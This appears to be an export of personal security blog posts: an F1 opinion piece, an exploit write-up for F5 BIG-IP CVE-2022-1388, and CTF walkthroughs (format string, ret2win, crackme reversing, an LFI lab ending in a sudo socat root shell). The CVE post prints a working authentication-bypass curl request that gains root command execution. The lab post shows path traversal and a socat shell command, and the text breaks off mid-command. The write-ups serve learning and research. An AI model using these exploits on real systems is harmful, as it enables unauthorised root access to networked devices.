[{"content":" I have one idea on how to fix Formula 1. If we want racing to be more fair, we should have the same cars for every driver.\nSo, the idea is that drivers\u0026rsquo; points will be counted as they are now, with a certain amount of points awarded for each race and position. However, the constructor championship will not be calculated as the sum of drivers\u0026rsquo; points in the same team.\nThere will be a central database of all car parts, and every team can conduct research and develop each part. Once a part is released, it has to be uploaded to this central database where every other team can see the detailed specifications and replicate the part based on those specifications. The team that develops the most useful parts, as determined by other teams, will earn the most points.\nAdditionally, a team with limited funds could build a car capable of winning the driver championship by essentially copying everything from the best team, leaving the outcome to the drivers\u0026rsquo; skills. However, this team with limited funds wouldn\u0026rsquo;t be able to win the constructor championship because they wouldn\u0026rsquo;t be developing any parts, merely copying from other teams. This system would create more equality among drivers (and also eliminate the need for the best drivers to win the constructor championship), making the constructor championship primarily about the engineers.\nI understand that there are many gaps, conditions, and details that would need to be addressed, but I believe the idea is quite good and worth considering.\n","permalink":"https://www.burso.eu/posts/how-to-fix-f1/","summary":"I have one idea on how to fix Formula 1. If we want racing to be more fair, we should have the same cars for every driver.\nSo, the idea is that drivers\u0026rsquo; points will be counted as they are now, with a certain amount of points awarded for each race and position. However, the constructor championship will not be calculated as the sum of drivers\u0026rsquo; points in the same team.","title":"How to fix Formula1 or how to make F1 even more exciting sport."},{"content":"Good afternoon to every security researcher. I would like to share my experience of finding announced vulnerability by internal F5 security team and writing the exploit for CVE-2022-1388.\nYou can read more about this vulnerability on thehackernews or helpnetsecurity. iControl REST is an API for interaction between scripts and F5 device, used to manage and control that device automatically.\nBased on the details of the mitigation, the problem should be somewhere in the Connection: header.\nmitigation \u0026lt;If \\\u0026#34;%{HTTP:connection} =~ /close/i \\\u0026#34;\u0026gt; RequestHeader set connection close \u0026lt;/If\u0026gt; \u0026lt;ElseIf \\\u0026#34;%{HTTP:connection} =~ /keep-alive/i \\\u0026#34;\u0026gt; RequestHeader set connection keep-alive \u0026lt;/ElseIf\u0026gt; \u0026lt;Else\u0026gt; RequestHeader set connection close \u0026lt;/Else\u0026gt; inside the library If we use diff and strings commands, we can see which strings were changed/added to the library, so I decided to download one from the vulnerable version BIGIP-16.1.0-0.0.19 and one from the fixed version BIGIP-16.1.2.2-0.0.28\n$ diff \u0026lt;(strings mod_auth_pam.so_new ) \u0026lt;(strings mod_auth_pam.so_old) ... 259,261d243 \u0026lt; Connection \u0026lt; close \u0026lt; keep-alive 268d249 ... header Connection We know that in F5, there is Jetty server without authentication on TCP/8100, which we can hit for example from localhost (F5 device). We also know that there is Apache which does the Authentication for Jetty. We also know that we can abuse hop-by-hop header there, but we don\u0026rsquo;t know which header we should pass to the Connection header. For more details about hop-by-hop headers you can read RFC2616\nexploit After couple of hours and tries I found the requirements to make the exploit functionable:\nX-F5-Auth-Token header must be present (that\u0026rsquo;s a requirement for Apache sends request to Jetty backend) Connection header must include X-F5-Auth-Token (based on hop-by-hop headers this will delete X-F5-Auth-Token from the request sended to the backend) Host header must be localhost or 127.0.0.1 (Jetty either checks this value or you can put X-Forwarded-Host to Connection header to make X-Forwarded-Host header invisible for Jetty) Authentication header must be admin user curl\n$ curl -vvv -sk -X POST -H \u0026#39;Content-Type: application/json\u0026#39; \u0026#39;https://admin@192.168.52.10/mgmt/tm/util/bash\u0026#39; --data \u0026#39;{\u0026#34;command\u0026#34;: \u0026#34;run\u0026#34; , \u0026#34;utilCmdArgs\u0026#34;: \u0026#34; -c id \u0026#34; }\u0026#39; -H \u0026#39;X-F5-Auth-Token: -\u0026#39; -H \u0026#39;Connection: close, X-F5-Auth-Token\u0026#39; -H \u0026#39;Host: localhost\u0026#39; * Trying 192.168.52.10:443... * Connected to 192.168.52.10 (192.168.52.10) port 443 (#0) * ALPN, offering h2 * ALPN, offering http/1.1 * successfully set certificate verify locations: * CAfile: /etc/ssl/cert.pem * CApath: none * (304) (OUT), TLS handshake, Client hello (1): * (304) (IN), TLS handshake, Server hello (2): * TLSv1.2 (IN), TLS handshake, Certificate (11): * TLSv1.2 (IN), TLS handshake, Server key exchange (12): * TLSv1.2 (IN), TLS handshake, Server finished (14): * TLSv1.2 (OUT), TLS handshake, Client key exchange (16): * TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1): * TLSv1.2 (OUT), TLS handshake, Finished (20): * TLSv1.2 (IN), TLS change cipher, Change cipher spec (1): * TLSv1.2 (IN), TLS handshake, Finished (20): * SSL connection using TLSv1.2 / ECDHE-RSA-AES128-GCM-SHA256 * ALPN, server did not agree to a protocol * Server certificate: * subject: C=--; ST=WA; L=Seattle; O=MyCompany; OU=MyOrg; CN=localhost.localdomain; emailAddress=root@localhost.localdomain * start date: May 7 08:55:32 2022 GMT * expire date: May 4 08:55:32 2032 GMT * issuer: C=--; ST=WA; L=Seattle; O=MyCompany; OU=MyOrg; CN=localhost.localdomain; emailAddress=root@localhost.localdomain * SSL certificate verify result: self signed certificate (18), continuing anyway. * Server auth using Basic with user \u0026#39;admin\u0026#39; \u0026gt; POST /mgmt/tm/util/bash HTTP/1.1 \u0026gt; Host: localhost \u0026gt; Authorization: Basic YWRtaW46 \u0026gt; User-Agent: curl/7.79.1 \u0026gt; Accept: */* \u0026gt; Content-Type: application/json \u0026gt; X-F5-Auth-Token: - \u0026gt; Connection: close, X-F5-Auth-Token \u0026gt; Content-Length: 45 \u0026gt; * Mark bundle as not supporting multiuse \u0026lt; HTTP/1.1 200 OK \u0026lt; Date: Tue, 10 May 2022 05:18:22 GMT \u0026lt; Server: Jetty(9.2.22.v20170606) \u0026lt; X-Frame-Options: SAMEORIGIN \u0026lt; Strict-Transport-Security: max-age=16070400; includeSubDomains \u0026lt; Content-Type: application/json; charset=UTF-8 \u0026lt; Allow: \u0026lt; Pragma: no-cache \u0026lt; Cache-Control: no-store \u0026lt; Cache-Control: no-cache \u0026lt; Cache-Control: must-revalidate \u0026lt; Expires: -1 \u0026lt; Content-Length: 168 \u0026lt; X-Content-Type-Options: nosniff \u0026lt; X-XSS-Protection: 1; mode=block \u0026lt; Content-Security-Policy: default-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39; \u0026#39;unsafe-eval\u0026#39; data: blob:; img-src \u0026#39;self\u0026#39; data: http://127.4.1.1 http://127.4.2.1 \u0026lt; Connection: close \u0026lt; * Closing connection 0 * TLSv1.2 (OUT), TLS alert, close notify (256): {\u0026#34;kind\u0026#34;:\u0026#34;tm:util:bash:runstate\u0026#34;,\u0026#34;command\u0026#34;:\u0026#34;run\u0026#34;,\u0026#34;utilCmdArgs\u0026#34;:\u0026#34; -c id\u0026#34;,\u0026#34;commandResult\u0026#34;:\u0026#34;uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0\\n\u0026#34;} tcpdump on F5 device\n$ tcpdump -i lo -s 0 -A \u0026#39;tcp[((tcp[12:1] \u0026amp; 0xf0) \u0026gt;\u0026gt; 2):4] = 0x504F5354\u0026#39; tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on lo, link-type EN10MB (Ethernet), capture size 65535 bytes 22:18:22.457963 IP localhost.localdomain.59668 \u0026gt; localhost.localdomain.xprint-server: Flags [P.], seq 2917914269:2917914711, ack 2716646422, win 342, options [nop,nop,TS val 245887457 ecr 245887457], length 442 E...\u0026#39;.@.@..........................V....... ........POST /mgmt/tm/util/bash HTTP/1.1 Host: localhost:8100 Authorization: Basic YWRtaW46 User-Agent: curl/7.79.1 Accept: */* Content-Type: application/json Local-Ip-From-Httpd: 192.168.52.10 X-F5-New-Authtok-Reqd: false X-Forwarded-Proto: http X-Forwarded-For: 192.168.52.1 X-Forwarded-Host: localhost X-Forwarded-Server: localhost.localdomain Connection: Keep-Alive Content-Length: 45 {\u0026#34;command\u0026#34;: \u0026#34;run\u0026#34; , \u0026#34;utilCmdArgs\u0026#34;: \u0026#34; -c id\u0026#34; } 22:18:22.461910 IP localhost.localdomain.50416 \u0026gt; localhost.localdomain.48470: Flags [P.], seq 3235108301:3235108827, ack 1593436189, win 3631, options [nop,nop,TS val 245887461 ecr 245836911], length 526 E..B.d@.@.PO...........V....^....../.7..... ......,oPOST /tmapi_mapper/util/bash HTTP/1.1 Content-Type: application/json Authorization: Basic YWRtaW46 X-Forwarded-For: 192.168.52.1 X-F5-Config-Api-Status: 1907 Referer: 192.168.52.1 User-Agent: com.f5.rest.common.RestRequestSender Accept: */* Connection: Keep-alive X-Forwarded-Proto: http X-Forwarded-Host: localhost X-F5-New-Authtok-Reqd: false Local-Ip-From-Httpd: 192.168.52.10 X-Forwarded-Server: localhost.localdomain Content-Length: 45 Host: localhost:48470 {\u0026#34;command\u0026#34;: \u0026#34;run\u0026#34; , \u0026#34;utilCmdArgs\u0026#34;: \u0026#34; -c id\u0026#34; } That\u0026rsquo;s all from my side, you can look at python exploit from Horizon3Attack team or read their blog: F5 iControl REST vulnerability.\ntwitter story I looked at CVE-2022-1388 and I would say it has something in common with https://t.co/oDUa4ZmIS4 #F5 #BIG-IP #CVE-2022-1388 https://t.co/JjqLLkyjFm\n\u0026mdash; Matus Bursa #strongertogether (@BursaMatus) May 8, 2022 ","permalink":"https://www.burso.eu/posts/big-ip-f5/","summary":"Good afternoon to every security researcher. I would like to share my experience of finding announced vulnerability by internal F5 security team and writing the exploit for CVE-2022-1388.\nYou can read more about this vulnerability on thehackernews or helpnetsecurity. iControl REST is an API for interaction between scripts and F5 device, used to manage and control that device automatically.\nBased on the details of the mitigation, the problem should be somewhere in the Connection: header.","title":"F5 BIG-IP iControl REST vulnerability CVE-2022-1388"},{"content":"Hello hackers, let\u0026rsquo;s solve another CTF from category easy. This challenge is about format string vulnerability\nFirst of all I look what type of file is it\n% file racecar racecar: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c5631a370f7704c44312f6692e1da56c25c1863c, not stripped So I started Ghidra and look at functions there There are couple of interesting functions with various name and after little bit of time looking at the functions I found the right one As you can see, there is a part where the file flag.txt is opened and the content of file is read to memory. Also you can write any message, which is printed then.\n__format = (char *)malloc(0x171); __stream = fopen(\u0026#34;flag.txt\u0026#34;,\u0026#34;r\u0026#34;); if (__stream == (FILE *)0x0) { printf(\u0026#34;%s[-] Could not open flag.txt. Please contact the creator.\\n\u0026#34;,\u0026amp;DAT_00011548,puVar5); /* WARNING: Subroutine does not return */ exit(0x69); } fgets(local_3c,0x2c,__stream); read(0,__format,0x170); puts( \u0026#34;\\n\\x1b[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \\x1b[0m\u0026#34; ); printf(__format); So directly to the point I printed stack with %08x.. .. and then convert hex values to ascii, of course don\u0026rsquo;t forget about little endian. Now we have a flag and finaly we can take a 🍺 and enjoy it. cheers!\n","permalink":"https://www.burso.eu/posts/racecar/","summary":"Hello hackers, let\u0026rsquo;s solve another CTF from category easy. This challenge is about format string vulnerability\nFirst of all I look what type of file is it\n% file racecar racecar: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c5631a370f7704c44312f6692e1da56c25c1863c, not stripped So I started Ghidra and look at functions there There are couple of interesting functions with various name and after little bit of time looking at the functions I found the right one As you can see, there is a part where the file flag.","title":"racecar"},{"content":"$ PYTHONIOENCODING=utf8 ./ret2win.py [!] Pwntools does not support 32-bit Python. Use a 64-bit release. [+] Starting local process \u0026#39;./ret2win32\u0026#39;: pid 26910 ret2win by ROP Emporium x86 For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer! What could possibly go wrong? You there, may I have your input please? And don\u0026#39;t worry about null bytes, we\u0026#39;re using read()! \u0026gt; Thank you! Well done! Here\u0026#39;s your flag: ROPE{a_placeholder_32byte_flag!} Finally, you can find my python script here.\n","permalink":"https://www.burso.eu/posts/ret2win/","summary":"$ PYTHONIOENCODING=utf8 ./ret2win.py [!] Pwntools does not support 32-bit Python. Use a 64-bit release. [+] Starting local process \u0026#39;./ret2win32\u0026#39;: pid 26910 ret2win by ROP Emporium x86 For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer! What could possibly go wrong? You there, may I have your input please? And don\u0026#39;t worry about null bytes, we\u0026#39;re using read()! \u0026gt; Thank you!","title":"ret2win"},{"content":"Hi, today I would like to show you how to solve easy RE CTF and how to start with RE, my directory after finish all challenges looks following:\n$ tree . ├── crackme_1 │ ├── crackme1 │ └── flag.txt ├── crackme_2 │ ├── crackme2 │ └── flag.txt ├── crackme_3 │ ├── crackme3 │ └── flag.txt ├── crackme_4 │ ├── crackme4 │ ├── flag.txt │ └── gdb_cmd ├── crackme_5 │ ├── crackme5 │ ├── flag.txt │ ├── preload.c │ └── preload.so ├── crackme_6 │ ├── crackme6 │ └── flag.txt ├── crackme_7 │ ├── crackme7 │ └── flag.txt └── crackme_8 ├── crackme8 ├── flag.txt └── gdb_cmd Before we start I would recommend following software\nr2 gdb And you can find this game here. Now let\u0026rsquo;s look deeper on each of the challenge.\ncrackme_1 $ file crackme1 crackme1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=672f525a7ad3c33f190c060c09b11e9ffd007f34, not stripped Okay, file is ELF, now we try to run it.\n$ ./crackme1 flag{not_that_kind_of_elf} :) It is enough to run it, nothing special so far.\ncrackme_2 $ file crackme2 crackme2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b799eb348f3df15f6b08b3c37f8feb269a60aba7, not stripped $ ./crackme2 Usage: ./crackme2 password $ ./crackme2 aaa Access denied. Let\u0026rsquo;s look strings in binary\n$ strings crackme2 /lib/ld-linux.so.2 libc.so.6 _IO_stdin_used puts printf memset strcmp ... Usage: %s password super_secret_password ... .got.plt .data .bss .comment Nice, we probably have password, let\u0026rsquo;s try it\n$ ./crackme2 super_secret_password Access granted. flag{if_i_submit_this_flag_then_i_will_get_points} Great, second flag is ours.\ncrackme_3 $ file crackme3 crackme3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4cf7250afb50109f0f1a01cc543fbf5ba6204a73, stripped $ strings crackme3 /lib/ld-linux.so.2 __gmon_start__ libc.so.6 _IO_stdin_used puts strlen malloc ... Usage: %s PASSWORD malloc failed ZjByX3kwdXJfNWVjMG5kX2xlNTVvbl91bmJhc2U2NF80bGxfN2gzXzdoMW5nNQ== Correct password! Come on, even my aunt Mildred got this one! ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ ... .got.plt .data .bss .comment There is a string encoded by base64\n$ echo \u0026#34;ZjByX3kwdXJfNWVjMG5kX2xlNTVvbl91bmJhc2U2NF80bGxfN2gzXzdoMW5nNQ==\u0026#34; | base64 -d f0r_y0ur_5ec0nd_le55on_unbase64_4ll_7h3_7h1ng5 Just couple of seconds and thirdth flag is on our side.\ncrackme_4 $ file crackme4 crackme4: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=862ee37793af334043b423ba50ec91cfa132260a, not stripped $ strings crackme4 /lib64/ld-linux-x86-64.so.2 libc.so.6 puts ... password OK password \u0026#34;%s\u0026#34; not OK Usage : %s password This time the string is hidden and we used strcmp ... Nothing special between strings, but we know, binary is using strcmp to compare \u0026ldquo;passwords\u0026rdquo;\n$ ./crackme4 Usage : ./crackme4 password This time the string is hidden and we used strcmp $ ./crackme4 AAA password \u0026#34;AAA\u0026#34; not OK Try to disassemble it and find place, where strcmp is called.\n$ objdump -D crackme4 | grep call | grep strcmp 4006d5: e8 46 fe ff ff callq 400520 \u0026lt;strcmp@plt\u0026gt; Prepare gdb_cmd file with following content:\nbreak * 0x4006D5 run aaa x/s $rax Let\u0026rsquo;s start gdb with commands from file gdb_cmd\n$ gdb -x gdb_cmd ./crackme4 GNU gdb (GDB) 10.1 ... Undefined command: \u0026#34;import\u0026#34;. Try \u0026#34;help\u0026#34;. Reading symbols from ./crackme4... (No debugging symbols found in ./crackme4) Breakpoint 1 at 0x4006d5 Breakpoint 1, 0x00000000004006d5 in compare_pwd () 0x7fffffffe440: \u0026#34;my_m0r3_secur3_pwd\u0026#34; (gdb) We can verify this password with the application crackme4\n$ ./crackme4 my_m0r3_secur3_pwd password OK crackme_5 $ file crackme5 crackme5: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a426dcf8ed3de8cb02f3ee4f38ee36b4ed568519, not stripped Again nothing special in strings so I will not give you output of strings command here now. Let\u0026rsquo;s look into function names which application is using\n$ gdb crackme5 GNU gdb (GDB) 10.1 ... Reading symbols from crackme5... (No debugging symbols found in crackme5) (gdb) info functions All defined functions: Non-debugging symbols: 0x0000000000400528 _init 0x0000000000400560 strncmp@plt 0x0000000000400570 puts@plt 0x0000000000400580 strlen@plt 0x0000000000400590 __stack_chk_fail@plt 0x00000000004005a0 __libc_start_main@plt 0x00000000004005b0 atoi@plt 0x00000000004005c0 __isoc99_scanf@plt 0x00000000004005d0 __gmon_start__@plt 0x00000000004005e0 _start 0x0000000000400610 deregister_tm_clones 0x0000000000400650 register_tm_clones 0x0000000000400690 __do_global_dtors_aux 0x00000000004006b0 frame_dummy 0x00000000004006d6 strcmp_ 0x0000000000400773 main 0x000000000040086e check 0x00000000004008d0 __libc_csu_init 0x0000000000400940 __libc_csu_fini 0x0000000000400944 _fini Okay, looks like strncmp is using for comparing password and your input, so we can override this function, let\u0026rsquo;s create preload.c file with following content:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; int strncmp(const char *s1, const char *s2, size_t n) { printf(\u0026#34;S1: [%s], S2: [%s]\\n\u0026#34;, s1, s2); int (*original_strcmp)(const char*, const char*, size_t); original_strcmp = dlsym(RTLD_NEXT, \u0026#34;strcmp\u0026#34;); return (*original_strcmp)(s1, s2, n); } Now compile our code and run crackme5 with following parameters to load our library:\n$ gcc -Wall -fPIC -shared -o preload.so preload.c -ldl $ LD_PRELOAD=./preload.so ./crackme5 Enter your input: AAA S1: [AAA], S2: [OfdlDSA|3tXb32~X3tX@sX`4tXtz] Always dig deeper Nice :) we have another flag.\ncrackme_6 $ file crackme6 crackme6: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=022f1a8e479cab9f7263af75bcdbb328bda7f291, not stripped When we look into functions, we can see function called my_secure_test there.\n$ gdb ./crackme6 GNU gdb (GDB) 10.1 ... Reading symbols from ./crackme6... (No debugging symbols found in ./crackme6) (gdb) info functions All defined functions: Non-debugging symbols: 0x0000000000400418 _init 0x0000000000400450 puts@plt 0x0000000000400460 printf@plt 0x0000000000400470 __libc_start_main@plt 0x0000000000400480 __gmon_start__@plt 0x0000000000400490 _start 0x00000000004004c0 deregister_tm_clones 0x00000000004004f0 register_tm_clones 0x0000000000400530 __do_global_dtors_aux 0x0000000000400550 frame_dummy 0x000000000040057d my_secure_test 0x00000000004006d1 compare_pwd 0x0000000000400711 main 0x0000000000400760 __libc_csu_init 0x00000000004007d0 __libc_csu_fini 0x00000000004007d4 _fini This function is starting on address 0x040057d and finishing on address 0x04006d0, so let\u0026rsquo;s find all cmp instructions between these two addresses\n$ objdump -D crackme6 | egrep -e \u0026#34;4005|4006\u0026#34; | grep \u0026#34;cmp \u0026#34; 400597: 3c 31 cmp $0x31,%al 4005bf: 3c 33 cmp $0x33,%al 4005e7: 3c 33 cmp $0x33,%al 40060f: 3c 37 cmp $0x37,%al 400637: 3c 5f cmp $0x5f,%al 40065f: 3c 70 cmp $0x70,%al 400684: 3c 77 cmp $0x77,%al 4006a9: 3c 64 cmp $0x64,%al When we convert hex values to characters in ASCII table, we get 1337_pwd\n$ ./crackme6 1337_pwd password OK crackme_7 Now we can look on crackme7 binary\n$ file crackme7 crackme7: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=7ee4206d91718e7b0bef16a7c03f8fa49c4a39e7, not stripped Again, nothing special in binary strings, so we look into functions\n$ r2 crackme7 -- Mess with the best, Die like the rest [0x080483c0]\u0026gt; aaa ... [0x080483c0]\u0026gt; afl 0x080483c0 1 33 entry0 0x08048380 1 6 sym.imp.__libc_start_main 0x08048400 4 43 sym.deregister_tm_clones 0x08048430 4 53 sym.register_tm_clones 0x08048470 3 30 sym.__do_global_dtors_aux 0x08048490 4 43 -\u0026gt; 40 entry.init0 0x080486a6 4 149 sym.giveFlag 0x080487a0 1 2 sym.__libc_csu_fini 0x080483f0 1 4 sym.__x86.get_pc_thunk.bx 0x080487a4 1 20 sym._fini 0x08048740 4 93 sym.__libc_csu_init 0x080484bb 20 491 main 0x08048324 3 35 sym._init 0x08048360 1 6 sym.imp.printf 0x08048370 1 6 sym.imp.puts 0x08048390 1 6 sym.imp.memset 0x080483a0 1 6 sym.imp.__isoc99_scanf Basicaly we want to call function sym.giveFlag on address 0x080486a6, so we need to find where the function is called\n[0x080483c0]\u0026gt; axt sym.giveFlag main 0x804867c [CALL] call sym.giveFlag Okay, so function is called in function main\n[0x080483c0]\u0026gt; pdf @ main you can see compare cmp eax, 0x7a69 instruction near before calling giveFlag function and again when we convert 7a69 hex to decimal, then we have a result.\n$ ./crackme7 Menu: [1] Say hello [2] Add numbers [3] Quit [\u0026gt;] 31337 Wow such h4x0r! flag{much_reversing_very_ida_wow} crackme_8 Okay, now we have last one so let\u0026rsquo;s get basic informations\n$ file crackme8 crackme8: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=fef76e38b5ff92ed0d08870ac523f9f3f8925a40, not stripped $ ./crackme8 Usage: ./crackme8 password $ ./crackme8 abcdef Access denied. $ r2 crackme8 -- 256 colors ought to be enough for anybody [0x080483a0]\u0026gt; aaa ... [0x080483a0]\u0026gt; afl 0x080483a0 1 33 entry0 0x08048360 1 6 sym.imp.__libc_start_main 0x080483e0 4 43 sym.deregister_tm_clones 0x08048410 4 53 sym.register_tm_clones 0x08048450 3 30 sym.__do_global_dtors_aux 0x08048470 4 43 -\u0026gt; 40 entry.init0 0x08048524 4 149 sym.giveFlag 0x08048620 1 2 sym.__libc_csu_fini 0x080483d0 1 4 sym.__x86.get_pc_thunk.bx 0x08048624 1 20 sym._fini 0x080485c0 4 93 sym.__libc_csu_init 0x0804849b 6 137 main 0x08048300 3 35 sym._init 0x08048340 1 6 sym.imp.printf 0x08048350 1 6 sym.imp.puts 0x08048370 1 6 sym.imp.memset 0x08048380 1 6 sym.imp.atoi [0x080483a0]\u0026gt; axt sym.giveFlag main 0x8048512 [CALL] call sym.giveFlag [0x080483a0]\u0026gt; pdf @ main You can see on address 0x080484e4 instruction cmp eax, 0xcafef00d so, now we can prepare gdb commands. Create file called gdb_cmd with following content:\nbreak * 0x080484E4 r 1 set $eax=3405705229 c Btw, decimal value 3405705229 in $eax register is converted from cafef00d hex. Now, we can run binary as follows:\n$ gdb -x gdb_cmd ./crackme8 GNU gdb (GDB) 10.1 ... Undefined command: \u0026#34;import\u0026#34;. Try \u0026#34;help\u0026#34;. Reading symbols from ./crackme8... (No debugging symbols found in ./crackme8) Breakpoint 1 at 0x80484e4 Breakpoint 1, 0x080484e4 in main () Access granted. flag{at_least_this_cafe_wont_leak_your_credit_card_numbers} [Inferior 1 (process 1537622) exited normally] (gdb) Done, we have the last flag we need. h4ppy r3v3r5e! ;)\n","permalink":"https://www.burso.eu/posts/reversing-elf/","summary":"Hi, today I would like to show you how to solve easy RE CTF and how to start with RE, my directory after finish all challenges looks following:\n$ tree . ├── crackme_1 │ ├── crackme1 │ └── flag.txt ├── crackme_2 │ ├── crackme2 │ └── flag.txt ├── crackme_3 │ ├── crackme3 │ └── flag.txt ├── crackme_4 │ ├── crackme4 │ ├── flag.txt │ └── gdb_cmd ├── crackme_5 │ ├── crackme5 │ ├── flag.","title":"Reversing ELF"},{"content":"Hi guys, after long time I have 5 minutes for playing game, so let\u0026rsquo;s play. I see new game called Inclusion with describe A beginner level LFI challenge. Yes, this is something I want to play and have been done quick.\nSo I am starting VPN tunnel to our playground and click on magic button Deploy machine.\nAs always first scan ports opened on the machine.\n$ nmap -T4 -sV 10.10.131.100 --top 100 Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-16 18:30 CET Nmap scan report for 10.10.131.100 Host is up (0.15s latency). Not shown: 98 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Werkzeug httpd 0.16.0 (Python 3.6.9) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.86 seconds Okay, so some default ports opened. Open the browser, read the articles, we can see, that there is only one parameter called name of article.\nGET /article?name=lfiattack ... Even without the ability to upload and execute code, a Local File Inclusion vulnerability can be dangerous. An attacker can still perform a Directory Traversal / Path Traversal attack using an LFI vulnerability as follows. http://example.com/?file=../../../../etc/passwd ... Okey, so at first we can try the version of LFI in the example. Let\u0026rsquo;s use CLI\n$ curl \u0026#39;http://10.10.131.100/article?name=../../../../etc/passwd\u0026#39; ... root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash #falconfeast:rootpassword sshd:x:110:65534::/run/sshd:/usr/sbin/nologin mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false ... It looks like we have password in the comment of the file /etc/passwd\n#falconfeast:rootpassword so let\u0026rsquo;s use ssh with the gained username/password\n$ ssh falconfeast@10.10.131.100 The authenticity of host \u0026#39;10.10.131.100 (10.10.131.100)\u0026#39; can\u0026#39;t be established. ECDSA key fingerprint is SHA256:VRi7CZbTMsqjwnWmH2UVPWrLVIZzG4BQ9J6X+tVsuEQ. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added \u0026#39;10.10.131.100\u0026#39; (ECDSA) to the list of known hosts. rfalconfeast@10.10.131.100\u0026#39;s password: Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Mon Mar 16 23:06:55 IST 2020 System load: 0.01 Processes: 84 Usage of /: 34.8% of 9.78GB Users logged in: 0 Memory usage: 64% IP address for eth0: 10.10.131.100 Swap usage: 0% * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch 3 packages can be updated. 3 updates are security updates. Last login: Thu Jan 23 18:41:39 2020 from 192.168.1.107 $ falconfeast@inclusion:~$ ls articles user.txt $ falconfeast@inclusion:~$ cat user.txt 60989655118397345799 In falconfeast\u0026rsquo;s homedir we can find the user.txt file with the flag user flag\n60989655118397345799 but how to get the root flag? let\u0026rsquo;s look for options\n$ sudo -l Matching Defaults entries for falconfeast on inclusion: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User falconfeast may run the following commands on inclusion: (root) NOPASSWD: /usr/bin/socat Okay, we can run socat under root priviledges without password. That\u0026rsquo;s enough for us.\nOn remote machine $ sudo socat TCP-LISTEN:1111,reuseaddr,fork EXEC:sh,pty,stderr,setsid,sigint,sane On local machine $ socat 